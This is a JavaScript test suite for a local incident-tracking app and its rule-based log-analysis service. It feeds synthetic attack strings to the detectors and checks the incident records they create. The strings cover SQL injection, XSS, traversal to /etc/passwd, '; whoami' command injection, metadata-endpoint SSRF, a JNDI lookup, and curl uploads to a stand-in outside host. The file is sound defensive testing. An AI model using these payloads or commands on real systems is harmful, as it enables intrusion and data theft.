const { after, before, beforeEach, describe, it } = require("node:test");
const assert = require("node:assert/strict");
const { execFileSync } = require("node:child_process");
const fs = require("node:fs/promises");
const os = require("node:os");
const path = require("node:path");

const tempDirectory = require("node:fs").mkdtempSync(path.join(os.tmpdir(), "incident-app-tests-"));
const dataFile = path.join(tempDirectory, "incidents.json");
const originalIncidentsFile = process.env.INCIDENTS_FILE;
process.env.INCIDENTS_FILE = dataFile;

const app = require("../backend/server");
const db = require("../backend/db");
const logAnalysisService = require("../backend/services/logAnalysisService");
const rules = require("../data/detection_rules.json");

const ruleExamples = {
  SQLI_001: "GET /items?id=1 OR 1=1",
  SQLI_002: "UNION SELECT username FROM accounts",
  SQLI_003: "DROP TABLE accounts",
  SQLI_004: "query SLEEP(5)",
  SQLI_005: "lookup INFORMATION_SCHEMA",
  XSS_001: "GET /?q=<script>alert(1)</script>",
  XSS_002: "<img onerror=\"alert(1)\">",
  XSS_003: "href=javascript:alert(",
  XSS_004: "GET /?q=<svg/onload=x>",
  NOSQL_001: "$gt: 1",
  TRAV_001: "GET /../../private/file",
  TRAV_002: "GET /etc/passwd",
  TRAV_003: "C:\\Windows\\System32\\cmd.exe",
  CMD_001: "shell input ; whoami",
  CMD_002: "powershell.exe -EncodedCommand abc",
  SSRF_001: "GET http://169.254.169.254/latest/meta-data",
  XXE_001: "<!ENTITY x SYSTEM \"file:///local/file\">",
  BF_001: "login failed\nlogin failed\nlogin failed",
  EXFIL_001: "curl http://localhost/archive",
  SENS_001: "api_key=\"dummy-test-value\"",
  SENS_002: "contact test@example.invalid",
  SCAN_001: "User-Agent: sqlmap/1.0",
  LDAP_001: "&(cn=*",
  DESER_001: "O:8:\"stdClass\":",
  HDR_001: "header\r\nLocation: /local/path",
  CONF_001: "GET /.env",
  SSTI_001: "template={{7*7}}",
  LOG4_001: "${jndi:ldap:localhost}",
  REDIR_001: "next=http://localhost/path",
  GRAPHQL_001: "query { __schema { types } }",
  CRLF_001: "encoded=%0d",
  JWT_001: "eyJabcdefghijk.abcdefghijk.x",
  PROM_001: "GET /actuator/health"
};

let server;
let baseUrl;

function startServer() {
  return new Promise((resolve, reject) => {
    const listener = app.listen(0, "127.0.0.1", () => resolve(listener));
    listener.once("error", reject);
  });
}

async function stopServer() {
  if (!server) return;
  const current = server;
  server = null;
  if (typeof current.closeAllConnections === "function") current.closeAllConnections();
  await new Promise((resolve, reject) => current.close((err) => (err ? reject(err) : resolve())));
}

async function restartServer() {
  await stopServer();
  server = await startServer();
  baseUrl = `http://127.0.0.1:${server.address().port}`;
}

async function request(method, route, body) {
  const options = { method, headers: {} };
  if (body !== undefined) {
    options.headers["Content-Type"] = "application/json";
    options.body = JSON.stringify(body);
  }
  const response = await fetch(`${baseUrl}${route}`, options);
  const raw = await response.text();
  let json = null;
  if (raw) {
    try { json = JSON.parse(raw); } catch { /* Keep non-JSON responses visible to assertions. */ }
  }
  return { response, json, raw };
}

async function writeFixture(incidents) {
  await fs.writeFile(dataFile, `${JSON.stringify(incidents, null, 2)}\n`, "utf8");
}

const overdueIncident = {
  incidentId: "INC-2020-0001",
  title: "Overdue fixture",
  description: "Temporary escalation fixture",
  severity: "HIGH",
  status: "OPEN",
  assignedTo: "Test-OnCall",
  slaDeadline: "2000-01-01T00:00:00.000Z",
  escalated: false,
  timeline: [{ timestamp: "2000-01-01T00:00:00.000Z", action: "CREATED", from: null, to: "OPEN", by: "Test-OnCall" }],
  createdAt: "2000-01-01T00:00:00.000Z",
  updatedAt: "2000-01-01T00:00:00.000Z"
};

describe("local incident application characterization", { concurrency: false }, () => {
  before(async () => {
    server = await startServer();
    baseUrl = `http://127.0.0.1:${server.address().port}`;
  });

  beforeEach(async () => {
    await writeFixture([]);
  });

  after(async () => {
    await stopServer();
    if (originalIncidentsFile === undefined) delete process.env.INCIDENTS_FILE;
    else process.env.INCIDENTS_FILE = originalIncidentsFile;
    await fs.rm(tempDirectory, { recursive: true, force: true });
  });

  it("GET /health returns the current success response", async () => {
    const { response, json } = await request("GET", "/health");
    assert.equal(response.status, 200);
    assert.deepEqual(json, { message: "API is running" });
  });

  it("supports incident list, get, create, update, delete, and missing-ID responses", async () => {
    assert.deepEqual((await request("GET", "/incidents")).json, []);

    const created = await request("POST", "/incidents", {
      title: "API test incident", description: "Created by an isolated test", severity: "medium", assignedTo: "Test User"
    });
    assert.equal(created.response.status, 200);
    const incident = created.json;
    assert.match(incident.incidentId, /^INC-\d{4}-\d{4,}$/);
    assert.equal(incident.severity, "MEDIUM");
    assert.equal(incident.status, "OPEN");

    const fetched = await request("GET", `/incidents/${incident.incidentId}`);
    assert.equal(fetched.response.status, 200);
    assert.equal(fetched.json.incidentId, incident.incidentId);
    assert.equal((await request("GET", "/incidents")).json.length, 1);

    const updated = await request("PUT", `/incidents/${incident.incidentId}`, {
      status: "IN_PROGRESS", assignedTo: "Next OnCall", by: "Test Actor"
    });
    assert.equal(updated.response.status, 200);
    assert.equal(updated.json.status, "IN_PROGRESS");
    assert.equal(updated.json.assignedTo, "Next OnCall");
    assert.equal(updated.json.timeline.length, 3);

    const deleted = await request("DELETE", `/incidents/${incident.incidentId}`);
    assert.equal(deleted.response.status, 200);
    assert.deepEqual((await request("GET", "/incidents")).json, []);
    assert.equal((await request("GET", `/incidents/${incident.incidentId}`)).response.status, 404);
    assert.equal((await request("PUT", `/incidents/${incident.incidentId}`, { status: "RESOLVED" })).response.status, 404);
    assert.equal((await request("DELETE", `/incidents/${incident.incidentId}`)).response.status, 404);
    assert.equal((await request("GET", "/incidents/not-an-id")).response.status, 400);
  });

  it("rejects invalid create fields, severities, and client-owned timestamps", async () => {
    const missingRequired = await request("POST", "/incidents", { severity: "HIGH", assignedTo: "Test" });
    assert.equal(missingRequired.response.status, 400);
    assert.equal((await request("POST", "/incidents", { title: "Bad", assignedTo: "Test" })).response.status, 400);
    assert.equal((await request("POST", "/incidents", { title: "Bad", severity: "HIGH" })).response.status, 400);
    assert.equal((await request("POST", "/incidents", { title: "Bad", severity: "BOGUS", assignedTo: "Test" })).response.status, 400);
    assert.equal((await request("POST", "/incidents", { title: "Bad", severity: "HIGH", assignedTo: " " })).response.status, 400);
    assert.equal((await request("POST", "/incidents", { title: "Bad", severity: "HIGH", assignedTo: "Test", createdAt: "2000-01-01" })).response.status, 400);
  });

  it("rejects invalid update status, server timestamps, and invalid identifiers", async () => {
    const created = (await request("POST", "/incidents", { title: "Valid", severity: "LOW", assignedTo: "Test" })).json;
    assert.equal((await request("PUT", `/incidents/${created.incidentId}`, { status: "CLOSED" })).response.status, 400);
    assert.equal((await request("PUT", `/incidents/${created.incidentId}`, { updatedAt: "2000-01-01" })).response.status, 400);
    assert.equal((await request("PUT", "/incidents/bad-id", { status: "OPEN" })).response.status, 400);
  });

  it("returns dashboard fields without changing the incident file", async () => {
    await writeFixture([overdueIncident]);
    const beforeBytes = await fs.readFile(dataFile);
    const { response, json } = await request("GET", "/dashboard");
    const afterBytes = await fs.readFile(dataFile);
    assert.equal(response.status, 200);
    assert.deepEqual(Object.keys(json).sort(), ["critical", "escalatedCount", "healthScore", "inProgress", "open", "resolved", "total"].sort());
    assert.equal(json.total, 1);
    assert.equal(json.open, 1);
    assert.deepEqual(json.healthScore, { value: 7, label: "Degraded", color: "yellow" });
    assert.deepEqual(afterBytes, beforeBytes);
  });

  it("POST /escalations/run escalates an overdue active incident", async () => {
    await writeFixture([overdueIncident]);
    const { response, json } = await request("POST", "/escalations/run", {});
    assert.equal(response.status, 200);
    assert.equal(json.escalatedCount, 1);
    const stored = await db.getIncidentById(overdueIncident.incidentId);
    assert.equal(stored.severity, "CRITICAL");
    assert.equal(stored.escalated, true);
    assert.equal(stored.timeline.at(-1).action, "ESCALATED");
  });

  for (const rule of rules) {
    it(`rule ${rule.id} detects its synthetic example`, async () => {
      assert.ok(ruleExamples[rule.id], `Missing synthetic example for ${rule.id}`);
      const result = await logAnalysisService.analyzeLogs(ruleExamples[rule.id]);
      const finding = result.matchedRules.find((match) => match.id === rule.id);
      assert.ok(finding, `Expected ${rule.id} in matches; got ${result.matchedRules.map((match) => match.id).join(", ")}`);
      assert.equal(finding.severity, rule.severity.toUpperCase());
      assert.equal(finding.type, rule.type);
      assert.ok(finding.count >= (rule.repeatThreshold || 1));
    });
  }

  it("does not match an ordinary benign log", async () => {
    const result = await logAnalysisService.analyzeLogs("2026-09-29 12:00:00 request completed successfully");
    assert.deepEqual(result, { status: "clean", type: "None", severity: "LOW", matchedRules: [] });
  });

  it("characterizes that NOSQL_001 misses the usual quoted JSON key form", async () => {
    const result = await logAnalysisService.analyzeLogs('{"$gt": 1}');
    assert.equal(result.matchedRules.some((match) => match.id === "NOSQL_001"), false);
  });

  it("uses threshold one for ordinary rules and a threshold of three for BF_001", async () => {
    const ordinary = await logAnalysisService.analyzeLogs("OR 1=1");
    assert.equal(ordinary.matchedRules.find((match) => match.id === "SQLI_001").count, 1);

    const below = await logAnalysisService.analyzeLogs("login failed\nlogin failed");
    assert.equal(below.matchedRules.some((match) => match.id === "BF_001"), false);

    const reached = await logAnalysisService.analyzeLogs("login failed\nlogin failed\nlogin failed");
    assert.equal(reached.matchedRules.find((match) => match.id === "BF_001").count, 3);

    const above = await logAnalysisService.analyzeLogs("login failed\nlogin failed\nlogin failed\nlogin failed");
    assert.equal(above.matchedRules.find((match) => match.id === "BF_001").count, 4);
  });

  it("aggregates severity from LOW, HIGH, and CRITICAL rules and preserves rule-file order on ties", async () => {
    const low = await logAnalysisService.analyzeLogs("contact test@example.invalid");
    assert.equal(low.severity, "LOW");
    assert.equal(low.type, "PII Exposure");

    const high = await logAnalysisService.analyzeLogs("OR 1=1");
    assert.equal(high.severity, "HIGH");

    const mixed = await logAnalysisService.analyzeLogs("OR 1=1\nDROP TABLE users");
    assert.equal(mixed.severity, "CRITICAL");
    assert.equal(mixed.type, "SQL Injection");
    assert.deepEqual(mixed.matchedRules.map((match) => match.id), ["SQLI_001", "SQLI_003"]);

    const tied = await logAnalysisService.analyzeLogs("OR 1=1\n../../private/file");
    assert.deepEqual(tied.matchedRules.map((match) => match.id), ["SQLI_001", "TRAV_001"]);
    assert.equal(tied.severity, "HIGH");
    assert.equal(tied.type, "SQL Injection");
  });

  it("returns clean log results without creating an incident", async () => {
    const { response, json } = await request("POST", "/analyze-logs", { logs: "ordinary request completed" });
    assert.equal(response.status, 200);
    assert.equal(json.detection.status, "clean");
    assert.equal(json.incident, null);
    assert.deepEqual(await db.getAllIncidents(), []);
  });

  it("preserves the log-analysis API shape and creates one incident for each registered event-aware match", async () => {
    const cases = [
      ["TRAV_001", "Path Traversal", String.raw`/\u002e\u002e/\u002e\u002e/private/file`],
      ["TRAV_002", "Local File Inclusion", String.raw`\u002fetc\u002fpasswd`],
      ["PROM_001", "Information Disclosure", String.raw`\u002factuator\u002fmetrics`],
      ["CONF_001", "Configuration Exposure", String.raw`\u002fsettings\u002fconfig\u002eenv`]
    ];

    for (const [ruleId, type, pathValue] of cases) {
      const logs = [
        `{"message":"request","path":"${pathValue}"}`,
        '{"message":"second request"}'
      ].join("\n");
      const { response, json } = await request("POST", "/analyze-logs", { logs });
      assert.equal(response.status, 200);
      assert.deepEqual(Object.keys(json).sort(), ["detection", "incident"]);
      assert.equal(json.detection.matchedRules.filter((rule) => rule.id === ruleId).length, 1);
      assert.ok(json.detection.matchedRules.every((rule) => !Object.hasOwn(rule, "evidence")));
      assert.ok(json.detection.matchedRules.every((rule) =>
        JSON.stringify(Object.keys(rule).sort()) === JSON.stringify(["count", "description", "id", "pattern", "severity", "type"])
      ));
      assert.equal(json.incident.title, `${type} (${ruleId})`);
    }
    assert.equal((await db.getAllIncidents()).length, cases.length);
  });

  it("detects SQL injection, XSS, SSRF, and brute force through the API", async () => {
    const cases = [
      ["OR 1=1", "SQLI_001"],
      ["<script>alert(1)</script>", "XSS_001"],
      ["http://169.254.169.254/latest", "SSRF_001"],
      ["login failed\nlogin failed\nlogin failed", "BF_001"]
    ];
    for (const [logs, ruleId] of cases) {
      const { response, json } = await request("POST", "/analyze-logs", { logs });
      assert.equal(response.status, 200);
      assert.ok(json.detection.matchedRules.some((match) => match.id === ruleId));
      assert.ok(json.incident.incidentId);
    }
  });

  it("keeps incident behavior the same for legacy and context-aware BF_001 detections", async () => {
    const legacyLogs = "login failed\nlogin failed\nlogin failed";
    const legacy = await request("POST", "/analyze-logs", { logs: legacyLogs });
    const structuredLogs = [0, 60_000, 120_000].map((offset) => JSON.stringify({
      timestamp: new Date(Date.parse("2026-01-01T00:00:00.000Z") + offset).toISOString(),
      message: "login failed",
      clientIp: "10.0.0.1",
      authentication: { result: "failed" }
    })).join("\n");
    const contextAware = await request("POST", "/analyze-logs", { logs: structuredLogs });

    assert.equal(legacy.response.status, 200);
    assert.equal(contextAware.response.status, 200);
    for (const result of [legacy, contextAware]) {
      assert.deepEqual(Object.keys(result.json).sort(), ["detection", "incident"]);
      assert.equal(result.json.detection.status, "threat_detected");
      assert.equal(result.json.detection.severity, "CRITICAL");
      assert.equal(result.json.detection.matchedRules.filter((rule) => rule.id === "BF_001").length, 1);
      const serialized = JSON.stringify(result.json);
      for (const internalName of ["groupId", "eventIds", "evidence", "correlationWindow", "windowMs", "Finding", "clientIp"]) {
        assert.equal(serialized.includes(`\"${internalName}\"`), false, `${internalName} must not be an API property`);
      }
    }
    assert.equal(contextAware.json.detection.matchedRules.filter((rule) => rule.id === "BF_001").length, 1);
    assert.ok(contextAware.json.detection.matchedRules.every((rule) =>
      !Object.hasOwn(rule, "evidence") && !Object.hasOwn(rule, "eventIds")
    ));
    assert.deepEqual(
      Object.keys(contextAware.json.detection.matchedRules.find((rule) => rule.id === "BF_001")).sort(),
      ["count", "description", "id", "pattern", "severity", "type"]
    );
    assert.equal(legacy.json.incident.title, "Brute Force (BF_001)");
    assert.equal(contextAware.json.incident.title, legacy.json.incident.title);
    assert.equal(contextAware.json.incident.severity, legacy.json.incident.severity);
    assert.equal(contextAware.json.incident.assignedTo, legacy.json.incident.assignedTo);
    assert.equal(contextAware.json.incident.status, legacy.json.incident.status);
    assert.equal((await db.getAllIncidents()).length, 2);

    await restartServer();
    const persistedIncidents = await request("GET", "/incidents");
    assert.equal(persistedIncidents.response.status, 200);
    for (const result of [legacy, contextAware]) {
      const persisted = persistedIncidents.json.find((incident) => incident.incidentId === result.json.incident.incidentId);
      assert.ok(persisted, `incident ${result.json.incident.incidentId} should persist across server restart`);
      assert.equal(persisted.title, "Brute Force (BF_001)");
      assert.equal(persisted.severity, "CRITICAL");
      assert.equal(persisted.status, "OPEN");
    }
  });

  it("creates the existing incident for a REDIR_001 event-aware-only match without exposing evidence", async () => {
    const logs = [
      String.raw`{"message":"redirect","query":"next\u003dhttps://outside.example/path"}`,
      String.raw`{"message":"ordinary","query":"page=2"}`
    ].join("\n");
    const raw = await logAnalysisService.analyzeLogs(logs);
    assert.equal(raw.matchedRules.some((rule) => rule.id === "REDIR_001"), false);

    const { response, json } = await request("POST", "/analyze-logs", { logs });
    assert.equal(response.status, 200);
    assert.deepEqual(Object.keys(json).sort(), ["detection", "incident"]);
    assert.equal(json.detection.status, "threat_detected");
    assert.equal(json.detection.matchedRules.filter((rule) => rule.id === "REDIR_001").length, 1);
    assert.equal(json.detection.matchedRules.find((rule) => rule.id === "REDIR_001").count, 1);
    assert.deepEqual(
      Object.keys(json.detection.matchedRules.find((rule) => rule.id === "REDIR_001")).sort(),
      ["count", "description", "id", "pattern", "severity", "type"]
    );
    assert.equal(json.incident.title, "Open Redirect (REDIR_001)");
    assert.equal(json.incident.severity, "MEDIUM");
    assert.equal(json.incident.status, "OPEN");
    assert.equal(json.incident.assignedTo, "Auto-System");
    assert.equal((await db.getAllIncidents()).length, 1);

    await restartServer();
    const persisted = await request("GET", `/incidents/${json.incident.incidentId}`);
    assert.equal(persisted.response.status, 200);
    assert.equal(persisted.json.incidentId, json.incident.incidentId);
    assert.equal(persisted.json.title, "Open Redirect (REDIR_001)");
  });

  it("creates the existing incident for a SCAN_001 JSON User-Agent event-aware-only match", async () => {
    const logs = [
      '{"message":"request","userAgent":"nikto/2.1"}',
      '{"message":"ordinary request","userAgent":"ExampleSDK/4.2"}'
    ].join("\n");
    const raw = await logAnalysisService.analyzeLogs(logs);
    assert.equal(raw.matchedRules.some((rule) => rule.id === "SCAN_001"), false);

    const { response, json } = await request("POST", "/analyze-logs", { logs });
    assert.equal(response.status, 200);
    assert.deepEqual(Object.keys(json).sort(), ["detection", "incident"]);
    assert.equal(json.detection.status, "threat_detected");
    const scannerMatches = json.detection.matchedRules.filter((rule) => rule.id === "SCAN_001");
    assert.equal(scannerMatches.length, 1);
    assert.equal(scannerMatches[0].count, 1);
    assert.deepEqual(Object.keys(scannerMatches[0]).sort(),
      ["count", "description", "id", "pattern", "severity", "type"]);
    assert.equal(json.incident.title, "Scanner Detection (SCAN_001)");
    assert.equal(json.incident.severity, "MEDIUM");
    assert.equal(json.incident.status, "OPEN");
    assert.equal((await db.getAllIncidents()).length, 1);
  });

  it("keeps one SCAN_001 match and one incident when raw and event-aware detection overlap", async () => {
    const logs = "User-Agent: sqlmap/1.0";
    const raw = await logAnalysisService.analyzeLogs(logs);
    const rawScannerMatch = raw.matchedRules.find((rule) => rule.id === "SCAN_001");
    assert.ok(rawScannerMatch);

    const { response, json } = await request("POST", "/analyze-logs", { logs });
    assert.equal(response.status, 200);
    const scannerMatches = json.detection.matchedRules.filter((rule) => rule.id === "SCAN_001");
    assert.equal(scannerMatches.length, 1);
    assert.equal(scannerMatches[0].count, rawScannerMatch.count);
    assert.equal(json.incident.title, "Scanner Detection (SCAN_001)");
    assert.equal((await db.getAllIncidents()).length, 1);
  });

  it("creates the existing incident for an EXFIL_001 event-aware-only process command", async () => {
    const logs = [
      String.raw`{"message":"transfer","process":{"command":"\u0063url https://outside.example/file"}}`,
      '{"message":"ordinary","process":{"command":"cat /var/log/app.log"}}'
    ].join("\n");
    const raw = await logAnalysisService.analyzeLogs(logs);
    assert.equal(raw.matchedRules.some((rule) => rule.id === "EXFIL_001"), false);

    const { response, json } = await request("POST", "/analyze-logs", { logs });
    assert.equal(response.status, 200);
    assert.deepEqual(Object.keys(json).sort(), ["detection", "incident"]);
    assert.equal(json.detection.status, "threat_detected");
    const matches = json.detection.matchedRules.filter((rule) => rule.id === "EXFIL_001");
    assert.equal(matches.length, 1);
    assert.equal(matches[0].count, 1);
    assert.deepEqual(Object.keys(matches[0]).sort(),
      ["count", "description", "id", "pattern", "severity", "type"]);
    assert.equal(json.incident.title, "Data Exfiltration (EXFIL_001)");
    assert.equal(json.incident.severity, "HIGH");
    assert.equal(json.incident.status, "OPEN");
    assert.equal(json.incident.assignedTo, "Auto-System");
    assert.equal((await db.getAllIncidents()).length, 1);
  });

  it("creates the existing incident for an event-aware-only SQLI_001 body match without exposing evidence", async () => {
    const logs = [
      '{"message":"event A","http":{"body":"safe request"}}',
      String.raw`{"message":"event B","http":{"body":"id=1' \u004fR 1=1"}}`,
      '{"message":"event C","http":{"body":"another safe request"}}'
    ].join("\n");
    const raw = await logAnalysisService.analyzeLogs(logs);
    assert.equal(raw.matchedRules.some((rule) => rule.id === "SQLI_001"), false);

    const { response, json } = await request("POST", "/analyze-logs", { logs });
    assert.equal(response.status, 200);
    assert.deepEqual(Object.keys(json).sort(), ["detection", "incident"]);
    assert.equal(json.detection.status, "threat_detected");
    const matches = json.detection.matchedRules.filter((rule) => rule.id === "SQLI_001");
    assert.equal(matches.length, 1);
    assert.equal(matches[0].count, 1);
    assert.deepEqual(Object.keys(matches[0]).sort(),
      ["count", "description", "id", "pattern", "severity", "type"]);
    assert.equal(json.incident.title, "SQL Injection (SQLI_001)");
    assert.equal(json.incident.severity, "HIGH");
    assert.equal(json.incident.status, "OPEN");
    assert.equal(json.incident.assignedTo, "Auto-System");
    assert.equal((await db.getAllIncidents()).length, 1);
  });

  it("creates the existing incident for an event-aware-only SQLI_003 body match without exposing evidence", async () => {
    const logs = [
      JSON.stringify({ message: "event A", http: { body: "DROP\nTABLE users" } }),
      JSON.stringify({ message: "event B", http: { body: "ordinary request" } })
    ].join("\n");
    const raw = await logAnalysisService.analyzeLogs(logs);
    assert.equal(raw.matchedRules.some((rule) => rule.id === "SQLI_003"), false);

    const { response, json } = await request("POST", "/analyze-logs", { logs });
    assert.equal(response.status, 200);
    assert.deepEqual(Object.keys(json).sort(), ["detection", "incident"]);
    assert.equal(json.detection.status, "threat_detected");
    const matches = json.detection.matchedRules.filter((rule) => rule.id === "SQLI_003");
    assert.equal(matches.length, 1);
    assert.equal(matches[0].count, 1);
    assert.deepEqual(Object.keys(matches[0]).sort(),
      ["count", "description", "id", "pattern", "severity", "type"]);
    assert.equal(json.incident.title, "SQL Injection (SQLI_003)");
    assert.equal(json.incident.severity, "CRITICAL");
    assert.equal(json.incident.status, "OPEN");
    assert.equal((await db.getAllIncidents()).length, 1);
  });

  it("creates the existing request-input incident for SSRF_001 body, query, and URL matches", async () => {
    const inputCases = [
      ["body", String.raw`{"message":"event A","http":{"body":"http\u003a\u002f\u002f169.254.169.254/latest/meta-data"}}`],
      ["query", String.raw`{"message":"event A","http":{"query":"target=http\u003a\u002f\u002f169.254.169.254/latest/meta-data"}}`],
      ["url", String.raw`{"message":"event A","http":{"url":"http\u003a\u002f\u002f169.254.169.254/latest/meta-data"}}`]
    ];

    for (const [field, matchingEvent] of inputCases) {
      const logs = [
        matchingEvent,
        '{"message":"event B","http":{"body":"ordinary request"}}'
      ].join("\n");
      const raw = await logAnalysisService.analyzeLogs(logs);
      assert.equal(raw.matchedRules.some((rule) => rule.id === "SSRF_001"), false,
        `${field}: JSON unescaping makes this event-aware-only input`);

      const { response, json } = await request("POST", "/analyze-logs", { logs });
      assert.equal(response.status, 200);
      assert.deepEqual(Object.keys(json).sort(), ["detection", "incident"]);
      assert.equal(json.detection.status, "threat_detected");
      const matches = json.detection.matchedRules.filter((rule) => rule.id === "SSRF_001");
      assert.equal(matches.length, 1);
      assert.equal(matches[0].count, 1);
      assert.deepEqual(Object.keys(matches[0]).sort(),
        ["count", "description", "id", "pattern", "severity", "type"]);
      assert.equal(json.incident.title, "SSRF (SSRF_001)");
      assert.equal(json.incident.severity, "HIGH");
      assert.equal(json.incident.status, "OPEN");
      assert.equal(json.incident.assignedTo, "Auto-System");
    }

    assert.equal((await db.getAllIncidents()).length, inputCases.length);
  });

  it("keeps one EXFIL_001 match and one incident when raw and event-aware detection overlap", async () => {
    const logs = [
      '{"message":"transfer","process":{"command":"curl -X POST https://outside.example/upload"}}',
      '{"message":"ordinary","process":{"command":"cat /var/log/app.log"}}'
    ].join("\n");
    const raw = await logAnalysisService.analyzeLogs(logs);
    const rawMatch = raw.matchedRules.find((rule) => rule.id === "EXFIL_001");
    assert.ok(rawMatch);

    const { response, json } = await request("POST", "/analyze-logs", { logs });
    assert.equal(response.status, 200);
    const matches = json.detection.matchedRules.filter((rule) => rule.id === "EXFIL_001");
    assert.equal(matches.length, 1);
    assert.equal(matches[0].count, rawMatch.count);
    assert.equal(json.incident.title, "Data Exfiltration (EXFIL_001)");
    assert.equal((await db.getAllIncidents()).length, 1);
  });

  it("creates exactly one incident for a request matching multiple rules and preserves current fields", async () => {
    const logs = "OR 1=1 <script>alert(1)</script>";
    const { response, json } = await request("POST", "/analyze-logs", { logs });
    assert.equal(response.status, 200);
    assert.deepEqual(json.detection.matchedRules.map((match) => match.id), ["SQLI_001", "XSS_001"]);
    assert.equal(json.incident.title, "SQL Injection (SQLI_001)");
    assert.equal(json.incident.severity, "HIGH");
    assert.equal(json.incident.status, "OPEN");
    assert.equal(json.incident.assignedTo, "Auto-System");
    assert.equal(json.incident.timeline.length, 1);
    assert.deepEqual(json.incident.timeline[0], {
      timestamp: json.incident.createdAt, action: "CREATED", from: null, to: "OPEN", by: "Auto-System"
    });
    assert.equal(Date.parse(json.incident.slaDeadline) - Date.parse(json.incident.createdAt), 8 * 60 * 60 * 1000);
    assert.match(json.incident.description, /SQLI_001/);
    assert.match(json.incident.description, /OR 1=1 <script>alert\(1\)<\/script>/);
    assert.equal((await db.getAllIncidents()).length, 1);

    const repeated = await request("POST", "/analyze-logs", { logs });
    assert.notEqual(repeated.json.incident.incidentId, json.incident.incidentId);
    assert.equal((await db.getAllIncidents()).length, 2);
  });

  it("rejects invalid, empty, malformed, and oversized log-analysis requests", async () => {
    for (const body of [{}, { logs: "   " }, { logs: 12 }, { logs: [] }]) {
      assert.equal((await request("POST", "/analyze-logs", body)).response.status, 400);
    }

    const malformed = await fetch(`${baseUrl}/analyze-logs`, {
      method: "POST", headers: { "Content-Type": "application/json" }, body: "{"
    });
    assert.equal(malformed.status, 400);

    const oversized = await fetch(`${baseUrl}/analyze-logs`, {
      method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ logs: "x".repeat(110 * 1024) })
    });
    assert.equal(oversized.status, 413);
  });

  it("persists an incident across an HTTP server restart", async () => {
    const created = await request("POST", "/incidents", { title: "Persistence fixture", severity: "LOW", assignedTo: "Test" });
    const id = created.json.incidentId;
    await restartServer();
    const persisted = await request("GET", `/incidents/${id}`);
    assert.equal(persisted.response.status, 200);
    assert.equal(persisted.json.title, "Persistence fixture");

    const childCheck = `require('./backend/db').getIncidentById(${JSON.stringify(id)}).then((incident) => {
      if (!incident || incident.title !== 'Persistence fixture') process.exit(1);
      process.stdout.write(incident.incidentId);
    }).catch(() => process.exit(1));`;
    const childResult = execFileSync(process.execPath, ["-e", childCheck], {
      cwd: path.resolve(__dirname, ".."),
      env: { ...process.env, INCIDENTS_FILE: dataFile },
      encoding: "utf8"
    });
    assert.equal(childResult, id);
  });

  it("reports malformed storage instead of treating it as an empty database", async () => {
    await fs.writeFile(dataFile, "{ invalid JSON", "utf8");
    await assert.rejects(db.getAllIncidents(), /invalid JSON/);
    const response = await request("GET", "/incidents");
    assert.equal(response.response.status, 500);
    assert.deepEqual(response.json, { error: "Internal server error" });
  });

  it("serializes successful storage writes and leaves valid JSON without temporary files", async () => {
    await db.createIncident({ incidentId: "INC-2026-9001", title: "First" });
    await db.createIncident({ incidentId: "INC-2026-9002", title: "Second" });
    await db.updateIncident("INC-2026-9001", { status: "RESOLVED" });

    const raw = await fs.readFile(dataFile, "utf8");
    const records = JSON.parse(raw);
    assert.equal(records.length, 2);
    assert.equal(records[0].status, "RESOLVED");
    assert.equal(await db.deleteIncident("INC-2026-9002"), true);
    assert.equal((await db.getAllIncidents()).length, 1);
    assert.deepEqual((await fs.readdir(tempDirectory)).sort(), ["incidents.json"]);
  });
});
